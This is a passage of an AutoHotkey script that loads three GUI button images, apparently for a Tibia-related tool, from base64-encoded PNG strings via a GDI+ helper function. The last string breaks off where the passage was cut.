A_Args.PNG.HTibia      := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.CTA         := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HCTA        := Gdip_BitmapFromBase64(0,1,Data.PNG "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